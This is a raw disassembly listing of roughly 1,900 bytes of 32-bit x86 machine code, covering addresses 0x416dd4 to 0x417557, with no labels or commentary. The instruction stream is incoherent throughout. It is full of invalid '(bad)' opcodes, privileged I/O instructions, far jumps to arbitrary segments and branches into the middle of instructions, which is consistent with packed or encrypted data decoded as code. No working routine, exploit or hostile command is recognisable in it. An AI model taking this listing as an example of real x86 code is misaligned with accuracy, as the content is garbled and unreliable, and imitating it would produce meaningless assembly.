  416dd4:	sbb    al,0xf3
  416dd6:	push   ecx
  416dd7:	into   
  416dd8:	jns    0x416d64
  416dda:	mov    es,WORD PTR [eax+0x18ab51ba]
  416de0:	jle    0x416e1b
  416de2:	sbb    esp,esp
  416de4:	cmp    DWORD PTR [edi-0x2e],0xffffffcd
  416de8:	xchg   edi,eax
  416de9:	ins    BYTE PTR es:[edi],dx
  416dea:	clc    
  416deb:	shl    BYTE PTR [edi-0x7],0x2c
  416def:	les    ecx,FWORD PTR [edx-0x69]
  416df2:	scas   eax,DWORD PTR es:[edi]
  416df3:	fs jo  0x416da8
  416df6:	es xchg esp,eax
  416df8:	aad    0x68
  416dfa:	or     BYTE PTR [edi+ecx*2],dh
  416dfd:	xlat   BYTE PTR ds:[ebx]
  416dfe:	imul   ebp,DWORD PTR [edi],0x77
  416e01:	je     0x416e2c
  416e03:	mov    esi,fs
  416e05:	mov    ebp,0x4df6af3d
  416e0a:	xchg   esi,eax
  416e0b:	add    al,0xa8
  416e0d:	iret   
  416e0e:	or     ebp,DWORD PTR [edi+0x214d10b8]
  416e14:	(bad)  
  416e15:	jmp    0xac57:0x4f91b362
  416e1c:	ret    
  416e1d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e1f:	jno    0x416e73
  416e21:	into   
  416e22:	nop
  416e23:	dec    eax
  416e24:	lds    ebp,FWORD PTR [edx+0x5c]
  416e27:	sub    al,BYTE PTR ds:0xbbd22f8b
  416e2d:	or     eax,0x90040fd7
  416e32:	inc    esp
  416e33:	jl     0x416e61
  416e35:	push   ds
  416e36:	jmp    0x416e8e
  416e38:	mov    ds:0xff28ea57,al
  416e3d:	cmp    DWORD PTR [edi],edi
  416e3f:	mov    edx,0x2f73c64d
  416e44:	pop    ecx
  416e45:	fwait
  416e46:	jb     0x416e12
  416e48:	and    ecx,DWORD PTR [ecx]
  416e4a:	fcomp  DWORD PTR [edi]
  416e4c:	loopne 0x416df0
  416e4e:	(bad)  
  416e4f:	out    dx,eax
  416e50:	aad    0x74
  416e52:	mov    al,ds:0x90a39384
  416e57:	das    
  416e58:	mov    ebx,0x8466f38a
  416e5d:	mov    ds:0x6467139b,eax
  416e62:	stos   BYTE PTR es:[edi],al
  416e63:	pushf  
  416e64:	pop    esi
  416e65:	call   0x32a1a561
  416e6a:	jmp    FWORD PTR [edi]
  416e6c:	into   
  416e6d:	aam    0xe4
  416e6f:	mov    edi,fs
  416e71:	scas   al,BYTE PTR es:[edi]
  416e72:	sub    dh,BYTE PTR [ebp+0x7a833f7e]
  416e78:	retf   0x5bea
  416e7b:	imul   esp,DWORD PTR [ebp-0x45],0x77
  416e7f:	sti    
  416e80:	sub    ah,dh
  416e82:	cwde   
  416e83:	icebp  
  416e84:	stc    
  416e85:	data16 ja 0x416ef0
  416e88:	xor    DWORD PTR [eax+ebx*4],edx
  416e8b:	xchg   BYTE PTR [edi+0x18],ch
  416e8e:	gs fsubrp st(4),st
  416e91:	mov    ch,0xc6
  416e93:	cmp    DWORD PTR fs:[eax+0x2655b858],ebx
  416e9a:	in     al,0x24
  416e9c:	jbe    0x416f0b
  416e9e:	cmp    ecx,DWORD PTR [esi]
  416ea0:	cli    
  416ea1:	jne    0x416eef
  416ea3:	mov    ah,0xbf
  416ea5:	pop    ebp
  416ea6:	stos   DWORD PTR es:[edi],eax
  416ea7:	adc    eax,0xb63fdb3d
  416eac:	sbb    DWORD PTR [ebp+ebx*8-0x6cfd8406],edi
  416eb3:	lea    eax,[ecx]
  416eb5:	imul   edi,ecx,0xffffffa8
  416eb8:	jecxz  0x416f2d
  416eba:	arpl   WORD PTR [ebx+eax*1+0x31],ax
  416ebe:	add    BYTE PTR [ecx-0x6281620f],al
  416ec4:	or     al,0x19
  416ec6:	(bad)  
  416ec7:	cwde   
  416ec8:	neg    DWORD PTR [edx+eiz*4+0x70e3d96d]
  416ecf:	sub    al,0x5a
  416ed1:	cmovno esi,ecx
  416ed4:	fdiv   DWORD PTR [ecx-0x5a7343ee]
  416eda:	push   cs
  416edb:	mov    dl,bh
  416edd:	adc    al,0x29
  416edf:	or     bl,BYTE PTR [esi+0xf]
  416ee2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ee3:	add    ecx,DWORD PTR [ecx]
  416ee5:	pop    eax
  416ee6:	mov    dl,0xfc
  416ee8:	mov    WORD PTR [esi],cs
  416eea:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  416eec:	aad    0x93
  416eee:	cmp    esi,ebp
  416ef0:	data16 out 0x8e,ax
  416ef4:	mov    ecx,0x8f904c61
  416ef9:	iret   
  416efa:	into   
  416efb:	or     dh,BYTE PTR [edx+0x0]
  416efe:	pop    edx
  416eff:	sbb    BYTE PTR [esi-0x2c],bl
  416f02:	jns    0x416ec2
  416f04:	int3   
  416f05:	arpl   WORD PTR [esi],cx
  416f07:	pop    edx
  416f08:	dec    ebx
  416f09:	leave  
  416f0a:	sub    cl,cl
  416f0c:	scas   eax,DWORD PTR es:[edi]
  416f0d:	sub    dl,BYTE PTR [ebx+eiz*2]
  416f10:	loope  0x416f3f
  416f12:	xor    ebp,DWORD PTR [edi]
  416f14:	or     dh,ah
  416f16:	ret    
  416f17:	call   FWORD PTR [eax+0x3deed5dc]
  416f1d:	cmp    cl,BYTE PTR [ebp-0x3373ad13]
  416f23:	cwde   
  416f24:	mov    DWORD PTR [ecx],ecx
  416f26:	pop    ds
  416f27:	push   ecx
  416f28:	or     esp,ecx
  416f2a:	lods   eax,DWORD PTR ds:[esi]
  416f2b:	adc    eax,0x5404b6ff
  416f30:	mov    ch,0x4a
  416f32:	iret   
  416f33:	jmp    0xebd1:0x75c7a1af
  416f3a:	dec    ebx
  416f3b:	push   es
  416f3c:	stos   DWORD PTR es:[edi],eax
  416f3d:	rcr    BYTE PTR ds:0x4029a7f8,0x54
  416f44:	add    DWORD PTR [ecx+ecx*4-0x42868be7],eax
  416f4b:	mov    ebp,DWORD PTR [edi-0x13]
  416f4e:	inc    eax
  416f4f:	es (bad) 
  416f51:	xchg   esi,eax
  416f52:	push   ecx
  416f53:	test   eax,0x748d07dc
  416f58:	xchg   ecx,eax
  416f59:	xchg   esi,eax
  416f5a:	setno  BYTE PTR [edx-0x5eb4eef]
  416f61:	mov    ds:0x6f7f8f4a,al
  416f66:	lds    edi,FWORD PTR [esi+0x1d]
  416f69:	outs   dx,DWORD PTR ds:[esi]
  416f6a:	mov    ecx,0xe830d921
  416f6f:	pop    ebp
  416f70:	sar    eax,cl
  416f72:	sub    eax,0x162b8822
  416f77:	imul   edx,edx,0xc
  416f7a:	rol    cl,0xc4
  416f7d:	xchg   edi,eax
  416f7f:	pop    ebx
  416f80:	ja     0x416fe5
  416f82:	out    0x7b,eax
  416f84:	pop    ecx
  416f85:	shr    DWORD PTR [ecx+0x56],cl
  416f88:	popf   
  416f89:	sub    al,0x58
  416f8b:	sbb    eax,0x9662f0da
  416f90:	mov    ebp,0xf9e7debc
  416f95:	and    edi,DWORD PTR [eax-0x3c]
  416f98:	test   DWORD PTR [edx],eax
  416f9a:	dec    eax
  416f9b:	xor    bh,0xdd
  416f9e:	jnp    0x416fb7
  416fa0:	pusha  
  416fa1:	jg     0x416fd4
  416fa3:	sbb    cl,BYTE PTR [edi]
  416fa5:	repnz (bad) 
  416fa7:	loope  0x416fbe
  416fa9:	pop    esi
  416faa:	in     eax,0xc5
  416fac:	adc    DWORD PTR [ecx-0x33a0d208],0x78aa7dec
  416fb6:	inc    eax
  416fb7:	pop    ss
  416fb8:	sbb    DWORD PTR [ebp+ebp*8+0x4d4257d5],esi
  416fbf:	mov    esi,0x6a4e32c6
  416fc4:	rcl    ecx,1
  416fc6:	push   0xffffff96
  416fc8:	outs   dx,DWORD PTR ds:[esi]
  416fc9:	mov    bl,0xcd
  416fcb:	test   eax,0xfa3e3de1
  416fd0:	jp     0x416fbd
  416fd2:	adc    edx,edx
  416fd4:	pop    ss
  416fd5:	outs   dx,BYTE PTR ds:[esi]
  416fd6:	imul   ebx,DWORD PTR [edx],0x40c6ee78
  416fdc:	mov    dl,0x30
  416fde:	inc    eax
  416fdf:	aaa    
  416fe0:	sbb    DWORD PTR [esi+0x37d4ff03],0xffffffff
  416fe7:	xchg   esp,eax
  416fe8:	retf   
  416fe9:	sbb    ch,0xdc
  416fec:	test   al,0x79
  416fee:	ret    
  416fef:	aad    0xde
  416ff1:	daa    
  416ff2:	adc    al,0x4d
  416ff4:	test   al,0x8
  416ff6:	outs   dx,DWORD PTR ds:[esi]
  416ff7:	dec    edi
  416ff8:	add    ebx,DWORD PTR [ebp+0x64f5d475]
  416ffe:	outs   dx,DWORD PTR ds:[esi]
  416fff:	cld    
  417000:	mov    edx,0xa0037a64
  417005:	push   ecx
  417006:	icebp  
  417007:	cmp    al,0xac
  417009:	jno    0x41706c
  41700b:	aad    0x4f
  41700d:	dec    eax
  41700e:	dec    edx
  41700f:	rol    BYTE PTR [ebx+0x3654c1b7],1
  417015:	inc    eax
  417016:	dec    edi
  417017:	xchg   DWORD PTR [ebx+0x1b78b965],esp
  41701d:	jle    0x417031
  41701f:	cmp    bl,bh
  417021:	enter  0x21ca,0x83
  417025:	push   cs
  417026:	xchg   esp,eax
  417027:	or     BYTE PTR [ebx-0x22],dh
  41702a:	xchg   ecx,eax
  41702b:	dec    ebp
  41702c:	daa    
  41702d:	mov    esi,0xc5e05b7b
  417032:	std    
  417033:	mov    ecx,0x63c509ec
  417038:	outs   dx,BYTE PTR ds:[esi]
  417039:	adc    bl,BYTE PTR [ebp+0x38ae4b20]
  41703f:	mov    ds:0xc14c9886,al
  417044:	out    dx,al
  417045:	dec    edi
  417046:	inc    esi
  417047:	cmp    ebp,eax
  417049:	dec    ebx
  41704a:	push   ebp
  41704b:	imul   ecx,DWORD PTR [ecx+0x6c],0xffffffdb
  41704f:	popa   
  417050:	scas   eax,DWORD PTR es:[edi]
  417051:	inc    edi
  417052:	xchg   BYTE PTR [esi],dl
  417054:	(bad)  
  417055:	outs   dx,DWORD PTR es:[esi]
  417057:	dec    dl
  417059:	jbe    0x41700d
  41705b:	pop    es
  41705c:	les    ecx,FWORD PTR [ebx]
  41705e:	call   0xca1a8114
  417063:	jne    0x417054
  417065:	hlt    
  417066:	push   0x1c
  417068:	call   0x690:0xea993b9c
  41706f:	in     eax,0xca
  417071:	jmp    0x4170a1
  417073:	out    0xe1,eax
  417075:	add    BYTE PTR [edx-0x2fed839a],0x7f
  41707c:	mov    ah,0xaa
  41707e:	sub    eax,0xfbadc5cb
  417083:	dec    esi
  417084:	scas   al,BYTE PTR es:[edi]
  417085:	jp     0x417060
  417087:	or     eax,0x6e28ac1e
  41708c:	jo     0x4170d6
  41708e:	sbb    BYTE PTR [ecx+0x6b],al
  417091:	xchg   esi,eax
  417092:	adc    DWORD PTR [esi-0x60],ebx
  417095:	out    0xe7,al
  417097:	sbb    eax,0xba378829
  41709c:	or     edi,DWORD PTR [edi+0x58]
  41709f:	push   esp
  4170a0:	mov    bh,0xe
  4170a2:	dec    esi
  4170a3:	cmp    DWORD PTR [ecx],ecx
  4170a5:	pop    eax
  4170a6:	inc    esi
  4170a7:	mov    ebx,0x80b934a0
  4170ac:	popf   
  4170ad:	or     BYTE PTR [ecx],dh
  4170af:	mov    bh,0x83
  4170b1:	ror    DWORD PTR [ecx+edx*8],cl
  4170b4:	push   edi
  4170b5:	and    al,0x20
  4170b7:	push   0xffffffa4
  4170b9:	aas    
  4170ba:	pop    es
  4170bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170bc:	daa    
  4170bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170be:	add    ebx,esp
  4170c0:	jg     0x417123
  4170c2:	icebp  
  4170c3:	enter  0xf264,0x73
  4170c7:	outs   dx,DWORD PTR ds:[esi]
  4170c8:	push   ebx
  4170c9:	jmp    0x4170ca
  4170cb:	push   0xb28b2648
  4170d0:	popa   
  4170d1:	mov    al,ds:0x6a59ecbb
  4170d6:	shl    BYTE PTR [ecx+0x33],cl
  4170d9:	into   
  4170da:	xchg   ebp,eax
  4170db:	push   0x10101e23
  4170e0:	jle    0x4170a5
  4170e2:	jno    0x41709e
  4170e4:	adc    al,0x33
  4170e6:	cmp    edi,DWORD PTR [edi-0x56]
  4170e9:	xchg   ebx,eax
  4170ea:	push   edx
  4170eb:	dec    eax
  4170ec:	or     eax,0x20ae6145
  4170f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170f2:	push   0xffffffc8
  4170f4:	mov    DWORD PTR [edi-0x7f58aef],ebp
  4170fa:	nop
  4170fb:	pushf  
  4170fc:	push   cs
  4170fd:	push   0xf102d477
  417102:	dec    ecx
  417103:	js     0x4170e0
  417105:	inc    ebx
  417106:	sti    
  417107:	jecxz  0x41713d
  417109:	and    al,0x55
  41710b:	ret    
  41710c:	jmp    0xbcc7:0x1689457b
  417113:	jb     0x4170bd
  417115:	call   0xae8a:0x78bf2c0f
  41711c:	mov    ch,0xe8
  41711e:	jge    0x41717e
  417120:	dec    BYTE PTR [edx]
  417122:	pop    eax
  417123:	sub    al,0x3e
  417125:	xchg   ebx,eax
  417126:	mov    eax,0xc7166114
  41712b:	data16 mov dl,0x5
  41712e:	ret    
  41712f:	push   cs
  417130:	(bad)  
  417131:	jne    0x41713d
  417133:	ret    
  417134:	dec    esp
  417135:	retf   
  417136:	pop    eax
  417137:	add    al,al
  417139:	and    al,0xd7
  41713b:	gs loopne 0x417147
  41713e:	jo     0x41712d
  417140:	in     al,dx
  417141:	fimul  DWORD PTR [edi]
  417143:	mov    ds:0x68ebc3a5,eax
  417148:	fcomp  DWORD PTR [eax+0x4a]
  41714b:	mov    DWORD PTR [ebx-0x4326b164],eax
  417151:	mov    bl,0x23
  417153:	shr    DWORD PTR [esi],1
  417155:	jns    0x4171af
  417157:	call   0xd713:0xf5ff70
  41715e:	jl     0x417156
  417160:	in     al,0xe3
  417162:	aaa    
  417163:	sub    DWORD PTR [edi+0x79],ecx
  417166:	or     al,0x70
  417168:	in     eax,0xa5
  41716a:	cdq    
  41716b:	xchg   ecx,eax
  41716c:	xor    eax,0xcb18b3ef
  417171:	xor    al,0x55
  417173:	out    dx,eax
  417174:	jg     0x417112
  417176:	into   
  417177:	mov    ebx,ecx
  417179:	xchg   edx,eax
  41717a:	xor    BYTE PTR [edi+edx*8+0x44c6fdcf],ch
  417181:	push   0x260a45cc
  417186:	shl    BYTE PTR [esi],cl
  417188:	inc    ebx
  417189:	arpl   WORD PTR ds:0xcfbd4da4,dx
  41718f:	xor    esp,ecx
  417191:	or     al,BYTE PTR [ebx]
  417193:	sub    al,0x9e
  417195:	sub    al,0x55
  417197:	xlat   BYTE PTR ds:[ebx]
  417198:	fucomi st,st(5)
  41719a:	pop    ds
  41719b:	pop    eax
  41719c:	pushf  
  41719d:	sti    
  41719e:	setb   cl
  4171a1:	jns    0x4171d0
  4171a3:	imul   ebx,DWORD PTR [ebp-0x4e],0x898ea65b
  4171aa:	jp     0x4171e9
  4171ac:	cld    
  4171ad:	inc    ebx
  4171ae:	rol    DWORD PTR gs:[eax],1
  4171b1:	cmp    DWORD PTR ds:0x7dcdd141,0x54
  4171b8:	aas    
  4171b9:	repnz stos BYTE PTR es:[edi],al
  4171bb:	jmp    0x207aa928
  4171c0:	test   BYTE PTR [ebx-0x5e],cl
  4171c3:	repz ror BYTE PTR [edx+0x61],1
  4171c7:	xor    cl,BYTE PTR [esi-0x8]
  4171ca:	pop    esi
  4171cb:	call   0xf0fd2313
  4171d0:	mov    esi,0xb2811b2f
  4171d5:	and    BYTE PTR [edx-0x26c85be9],bh
  4171db:	or     esp,esi
  4171dd:	rcl    al,1
  4171df:	sbb    al,0x4f
  4171e1:	add    ch,BYTE PTR [edi]
  4171e3:	aam    0x34
  4171e5:	mov    BYTE PTR [edi],cl
  4171e7:	js     0x417263
  4171e9:	inc    ecx
  4171ea:	out    0xcb,al
  4171ec:	lock mov ch,0x2e
  4171ef:	pushf  
  4171f0:	clc    
  4171f1:	inc    esi
  4171f2:	aad    0x67
  4171f4:	ror    ah,0x7e
  4171f7:	cwde   
  4171f8:	mov    al,0x6e
  4171fa:	stc    
  4171fb:	daa    
  4171fc:	loopne 0x417266
  4171fe:	loopne 0x417275
  417200:	pop    ecx
  417201:	mov    eax,0x5df6ca51
  417206:	pushf  
  417207:	enter  0xa86f,0x98
  41720b:	mov    cl,0x28
  41720d:	add    eax,0xadb3231
  417212:	rol    BYTE PTR [eax],1
  417214:	push   0xee08aced
  417219:	aam    0xe8
  41721b:	mul    DWORD PTR [eax-0x1]
  41721e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41721f:	jb     0x4171c9
  417221:	push   0xf093f677
  417226:	into   
  417227:	and    bh,BYTE PTR [ebp-0x42b32ea4]
  41722d:	test   al,0x1f
  41722f:	cmp    al,0x93
  417231:	les    ebx,FWORD PTR [ecx+0x73]
  417234:	repnz and ch,BYTE PTR [eax]
  417237:	xor    BYTE PTR [esi+edi*1-0x1c],dl
  41723b:	xchg   ebp,eax
  41723c:	dec    esp
  41723d:	mul    BYTE PTR [esi]
  41723f:	or     BYTE PTR [edx],ch
  417241:	test   DWORD PTR ds:0x7608d9ba,eax
  417247:	mul    BYTE PTR [eax-0x63a9ad8a]
  41724d:	sub    DWORD PTR [edi-0x2c],ecx
  417250:	shl    BYTE PTR ds:0x67d99bcd,1
  417256:	add    esp,DWORD PTR [ecx]
  417258:	daa    
  417259:	fisubr WORD PTR ds:0xffcc955f
  41725f:	mov    cl,0xcc
  417261:	cmp    eax,0x6a4f4cd4
  417266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417267:	stc    
  417268:	jge    0x4172b7
  41726a:	xor    eax,eax
  41726c:	enter  0xaaaa,0x2e
  417270:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417271:	or     DWORD PTR [ecx-0x14],0xed03db76
  417278:	retf   
  417279:	out    0x95,al
  41727b:	sti    
  41727c:	adc    ah,dl
  41727e:	xor    BYTE PTR [ebp+0xf68a58b],bl
  417284:	out    0x3b,eax
  417286:	sbb    cl,0x5f
  417289:	pop    edx
  41728a:	xlat   BYTE PTR ds:[ebx]
  41728b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41728c:	ret    0x6e4b
  41728f:	(bad)  
  417290:	xchg   ecx,eax
  417291:	and    eax,0x241db040
  417296:	jne    0x4172a0
  417298:	push   cs
  417299:	loop   0x41726c
  41729b:	or     ecx,DWORD PTR [eax+0x2f]
  41729e:	sbb    ecx,DWORD PTR [eax]
  4172a0:	fs push cs
  4172a2:	jmp    0xfe786e05
  4172a7:	jp     0x4172a6
  4172a9:	cmp    DWORD PTR [ebx-0x41],ecx
  4172ac:	dec    ecx
  4172ad:	jl     0x417282
  4172af:	dec    ecx
  4172b0:	int    0x89
  4172b2:	mov    ch,0xd7
  4172b4:	adc    BYTE PTR [esi+0x143bfb88],0xfc
  4172bb:	loop   0x417298
  4172bd:	sbb    BYTE PTR [edx],al
  4172bf:	pop    esi
  4172c0:	nop
  4172c1:	add    ebx,esp
  4172c3:	(bad)  
  4172c4:	and    al,0x65
  4172c6:	pushf  
  4172c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172c8:	inc    ecx
  4172c9:	icebp  
  4172ca:	mov    dh,0x5
  4172cc:	fsub   DWORD PTR [ecx-0x47]
  4172cf:	lods   al,BYTE PTR ds:[esi]
  4172d0:	or     al,0xc5
  4172d2:	shr    DWORD PTR [esi],cl
  4172d4:	add    ebp,DWORD PTR [ebx]
  4172d6:	dec    edi
  4172d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172d8:	dec    edx
  4172d9:	int    0xb9
  4172db:	adc    BYTE PTR [esi+0x3c],bl
  4172de:	fcomp  DWORD PTR [ebx+eax*8+0x67]
  4172e2:	and    eax,0x819defcf
  4172e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172e8:	push   eax
  4172e9:	inc    ebp
  4172ea:	xchg   eax,ebx
  4172ec:	stc    
  4172ed:	stos   BYTE PTR es:[edi],al
  4172ee:	loope  0x417315
  4172f0:	sar    esi,1
  4172f2:	in     eax,0x92
  4172f4:	pop    es
  4172f5:	lea    ebp,[ecx-0x2ac2fca1]
  4172fb:	inc    edi
  4172fc:	push   esp
  4172fd:	daa    
  4172fe:	mov    dh,al
  417300:	xchg   esp,eax
  417301:	cmc    
  417302:	adc    al,0xe
  417304:	push   cs
  417305:	mov    edx,0xddbfcd8d
  41730a:	int    0xce
  41730c:	or     DWORD PTR [eax],0xffffffde
  41730f:	pop    edx
  417310:	(bad)  
  417311:	jne    0x417305
  417313:	xor    BYTE PTR [ecx-0x31],ah
  417316:	cmc    
  417317:	jno    0x417372
  417319:	pop    ds
  41731a:	sar    BYTE PTR [esi-0x4b59d02c],1
  417320:	aad    0x73
  417322:	das    
  417323:	push   ecx
  417324:	xchg   edx,eax
  417325:	xor    edx,DWORD PTR [ebx-0x42a56d02]
  41732b:	add    eax,0xf89ca447
  417330:	or     eax,0x6871688c
  417335:	sub    DWORD PTR [edx-0x41],ebp
  417338:	mov    ah,0xce
  41733a:	iret   
  41733b:	mov    BYTE PTR [edi],bh
  41733d:	inc    esi
  41733e:	cld    
  41733f:	mov    eax,0xe7a7a688
  417344:	lods   al,BYTE PTR ds:[esi]
  417345:	ja     0x417329
  417347:	fcomp  DWORD PTR [eax-0x3c10d7b0]
  41734d:	lahf   
  41734e:	pop    ebx
  41734f:	imul   esi,edx,0x34
  417352:	loope  0x417328
  417354:	or     bx,WORD PTR [esi+eiz*8+0x3]
  417359:	mov    al,ds:0x946d8213
  41735e:	shr    BYTE PTR [esi-0x68bcd3c1],1
  417364:	pop    esp
  417365:	test   eax,0x4dbe67a7
  41736a:	push   ds
  41736b:	dec    esi
  41736c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41736d:	int    0xbf
  41736f:	add    ebp,ecx
  417371:	inc    ecx
  417372:	int    0x17
  417374:	sbb    al,BYTE PTR [ecx+0x37]
  417377:	xor    edi,DWORD PTR [ecx+edi*4]
  41737a:	push   ds
  41737b:	addr16 xchg esp,eax
  41737d:	push   0xffffff9e
  41737f:	ins    DWORD PTR es:[edi],dx
  417380:	mov    esp,0x111f7510
  417385:	mov    ecx,0x12aecd71
  41738a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41738b:	outs   dx,BYTE PTR ds:[esi]
  41738c:	repz xor DWORD PTR [edx-0x11783288],edx
  417393:	cdq    
  417394:	pop    eax
  417395:	out    0xbb,eax
  417397:	pushf  
  417398:	cmp    dl,cl
  41739a:	cli    
  41739b:	lds    esi,FWORD PTR [ebx]
  41739d:	fs loopne 0x4173c9
  4173a0:	inc    eax
  4173a1:	ret    
  4173a2:	ret    
  4173a3:	cmp    eax,0x5c69bfa6
  4173a8:	pop    ds
  4173a9:	mul    eax
  4173ab:	(bad)  
  4173ac:	fprem  
  4173ae:	jae    0x41736e
  4173b0:	les    edx,FWORD PTR ds:0xe319e95f
  4173b6:	dec    ebp
  4173b7:	xchg   ebp,eax
  4173b8:	mov    ah,0xc1
  4173ba:	sub    al,0x81
  4173bc:	push   ds
  4173bd:	add    bl,BYTE PTR [ebx]
  4173bf:	jae    0x41737a
  4173c1:	adc    al,0x9d
  4173c3:	ins    BYTE PTR es:[edi],dx
  4173c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173c5:	ror    DWORD PTR [ebp+0x4cac86d1],cl
  4173cb:	sbb    DWORD PTR [ecx],0x35915f49
  4173d1:	or     ecx,DWORD PTR [ebx+0x17]
  4173d4:	sub    eax,0x2886890b
  4173d9:	mov    dl,0x11
  4173db:	jp     0x417363
  4173dd:	pop    es
  4173de:	retf   0xe471
  4173e1:	sar    BYTE PTR [ebp-0x47],1
  4173e4:	mov    ebp,0xcf5d05c
  4173e9:	lock ficom WORD PTR [edi]
  4173ec:	mov    cl,BYTE PTR [esi]
  4173ee:	imul   BYTE PTR [ecx-0x1549f511]
  4173f4:	jp     0x4173ed
  4173f6:	inc    BYTE PTR [edx+0x3]
  4173f9:	sub    ebx,DWORD PTR [esi]
  4173fb:	sar    DWORD PTR es:[ecx+0x30],cl
  4173ff:	nop
  417400:	xor    eax,DWORD PTR ds:0x860d97ce
  417406:	(bad)  
  417407:	pusha  
  417408:	(bad)  [edi+0x10c0b54d]
  41740e:	stos   BYTE PTR es:[edi],al
  41740f:	mov    BYTE PTR [ebx+0x40],0x37
  417413:	neg    edi
  417415:	xor    ah,ah
  417417:	das    
  417418:	pushf  
  417419:	clc    
  41741a:	cli    
  41741b:	dec    ecx
  41741c:	test   DWORD PTR [ecx-0x5d],ecx
  41741f:	lods   eax,DWORD PTR ds:[esi]
  417420:	in     al,0x53
  417422:	lods   al,BYTE PTR ds:[esi]
  417423:	int3   
  417424:	sub    BYTE PTR [edx],bh
  417426:	push   0xd1ba87f9
  41742b:	nop
  41742c:	js     0x4173d5
  41742e:	cmp    eax,0x3b602a4
  417433:	jl     0x41741b
  417435:	shl    DWORD PTR [edx-0x5c03c1f1],cl
  41743b:	cmova  edi,DWORD PTR [edx+0xab5795f]
  417442:	dec    ebp
  417443:	es ret 0xe115
  417447:	jmp    0x417458
  417449:	dec    esp
  41744a:	sbb    ah,bh
  41744c:	push   eax
  41744d:	pop    es
  41744e:	fcomi  st,st(3)
  417450:	leave  
  417451:	mov    al,0x4a
  417453:	mov    al,0x88
  417455:	lods   al,BYTE PTR ds:[esi]
  417456:	ja     0x4174c0
  417458:	imul   eax,DWORD PTR [esi],0x59
  41745b:	push   eax
  41745c:	cmp    BYTE PTR [ecx],cl
  41745e:	fisttp WORD PTR [esi+edx*2-0x7ae06e9a]
  417465:	shl    BYTE PTR [eax+edx*1+0x71],1
  417469:	(bad)  
  41746a:	ins    DWORD PTR es:[edi],dx
  41746b:	sub    DWORD PTR ds:[ebx],0xffffff90
  41746f:	jb     0x4174b4
  417471:	leave  
  417472:	pop    edx
  417473:	dec    esi
  417474:	stc    
  417475:	(bad)  
  417477:	loope  0x4174b6
  417479:	sub    esp,ebx
  41747b:	(bad)  
  41747c:	aad    0xec
  41747e:	mov    dl,0xbe
  417480:	das    
  417481:	dec    eax
  417482:	or     al,0xf9
  417484:	xchg   DWORD PTR [eax],esp
  417486:	ins    DWORD PTR es:[edi],dx
  417487:	dec    edx
  417488:	dec    esp
  417489:	pop    ds
  41748a:	mov    ds:0x1a97996d,eax
  41748f:	jmp    0xcacc:0x594aa
  417496:	or     bl,dl
  417498:	jge    0x417474
  41749a:	mov    esp,DWORD PTR [ebx+ebx*8]
  41749d:	inc    edi
  41749e:	lds    esi,FWORD PTR [edx-0x9]
  4174a1:	test   BYTE PTR ds:0xbab9aee9,bl
  4174a7:	and    esp,DWORD PTR [edi+0x77]
  4174aa:	push   eax
  4174ab:	daa    
  4174ac:	ss cs leave 
  4174af:	add    dl,bl
  4174b1:	imul   esi,DWORD PTR [ebx-0x41510a68],0xe4500f92
  4174bb:	and    DWORD PTR [ecx-0x22],eax
  4174be:	or     ebx,DWORD PTR [ebx+0xa]
  4174c1:	add    al,0x9e
  4174c3:	mov    al,0x56
  4174c5:	push   ebp
  4174c6:	aaa    
  4174c7:	push   esp
  4174c8:	or     BYTE PTR gs:[ebx+esi*2-0x44],dl
  4174cd:	push   ss
  4174ce:	call   0x859d:0x93010594
  4174d5:	out    dx,eax
  4174d6:	push   edi
  4174d7:	popa   
  4174d8:	mov    eax,ds:0x1d33b5ac
  4174dd:	add    al,0xf8
  4174df:	mov    edx,0x9d56be7a
  4174e4:	pop    esi
  4174e5:	jb     0x417518
  4174e7:	sub    al,ch
  4174e9:	xor    eax,0xd1a289e6
  4174ee:	dec    eax
  4174ef:	mov    BYTE PTR [eax+esi*2],dh
  4174f2:	mov    bl,0xec
  4174f4:	pop    edi
  4174f5:	stos   DWORD PTR es:[edi],eax
  4174f6:	in     eax,0x3c
  4174f8:	inc    edx
  4174f9:	retf   
  4174fa:	and    DWORD PTR [ecx],0x12ce14a2
  417500:	out    0x62,al
  417502:	ficomp DWORD PTR [ebx]
  417504:	or     DWORD PTR [esi+eax*1-0x79],edi
  417508:	pop    ebx
  417509:	xchg   edi,eax
  41750a:	mov    esp,0x31ba756
  41750f:	(bad)  
  417510:	xchg   ebp,eax
  417511:	and    al,0x18
  417513:	dec    ebp
  417514:	mov    eax,ds:0xb622b391
  417519:	gs stos BYTE PTR es:[edi],al
  41751b:	sub    eax,0xad4f9e1f
  417520:	pop    eax
  417521:	(bad)  
  417522:	pop    edx
  417523:	push   ebx
  417524:	shr    DWORD PTR [esi+ebx*2],cl
  417527:	mov    dh,0x5d
  417529:	ficom  WORD PTR [edi]
  41752b:	clc    
  41752c:	in     eax,0x38
  41752e:	xchg   esi,eax
  41752f:	xchg   esi,eax
  417530:	adc    BYTE PTR [ecx-0x788d72c9],ah
  417536:	(bad)  
  417537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417538:	jle    0x41759c
  41753a:	lea    edi,[ebx]
  41753c:	inc    edi
  41753d:	idiv   BYTE PTR [eax]
  41753f:	mov    ebx,0x951d224e
  417544:	push   edx
  417545:	jecxz  0x417522
  417547:	push   ss
  417548:	repnz mov bl,BYTE PTR [eax+0x4e]
  41754c:	and    BYTE PTR [eax],bh
  41754e:	out    dx,eax
  41754f:	stc    
  417550:	stc    
  417551:	je     0x41757f
  417553:	bound  esp,QWORD PTR [ebp+edi*2-0x58]
  417557:	add    bh,BYTE PTR [esi+0x7f2d1142]
